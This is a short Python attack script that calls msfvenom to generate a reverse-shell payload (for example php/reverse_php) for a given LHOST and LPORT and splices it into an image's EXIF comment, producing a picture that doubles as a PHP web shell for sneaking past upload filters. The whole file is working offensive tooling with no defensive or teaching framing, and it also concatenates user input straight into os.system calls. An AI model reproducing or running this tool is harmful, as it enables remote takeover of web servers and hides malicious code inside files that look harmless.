#! /usr/bin/python3

import argparse
import os
import sys


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--image", dest="image_file", help="Image: -i dog.jpg")
    parser.add_argument("-p", "--payload", dest="payload", help="Payload: -p php/reverse_php")
    parser.add_argument("-f", "--payload_format", dest="format", help="Payload Output format: -f raw")
    parser.add_argument("-lh", "--LHOST", dest="LHOST", help="LHOST: -lh 192.168.0.112")
    parser.add_argument("-lp", "--LPORT", dest="LPORT", help="LPORT: -lp 8080")
    options = parser.parse_args()
    return options


arguments = get_arguments()


if not arguments.image_file:
    print("[-] Please enter a valid image path.")
    sys.exit()
else:
    image_path = arguments.image_file


if not arguments.payload:
    print("[-] Please provide payload type. Refer to msfvenom payload list for same.")
    sys.exit()
else:
    payload = arguments.payload

if not arguments.format:
    print("[-] Please provide Output format")
    sys.exit()
else:
    payload_format = arguments.format

if not arguments.LHOST:
    print("[-] Please provide LHOST")
    sys.exit()
else:
    LHOST = arguments.LHOST

if not arguments.LPORT:
    print("[-] Please provide LPORT")
    sys.exit()
else:
    LPORT = arguments.LPORT

try:
    os.system("exiftool "+ image_path +" -Comment=MOFOTOKEN")

    os.system("msfvenom -p "+ payload +" LHOST=" + LHOST + " LPORT=" + LPORT + " -f "+ payload_format +" > shell_file")

    with open("shell_file","r") as shell_file:
        shell_code = shell_file.read()

    with open(image_path, "rb") as file:
        image_content = file.read()

    with open(image_path,"wb+") as file:
        new_image = image_content.replace(bytes("MOFOTOKEN", "utf-8"), bytes(shell_code+"//" , "utf-8"))
        lines = new_image.split(bytes("\n","utf-8"))
        lines[-1] = lines[-1].replace(bytes("\r","utf-8"), bytes("\r//","utf-8"))
        new_image = bytes("\n","utf-8").join(lines)
        file.write(new_image)
        
except KeyboardInterrupt:
    print("[-] Interrupt observed. Exiting...")
finally:
    print("[-] Cleaning up...")
    os.system("rm shell_file")
    sys.exit()
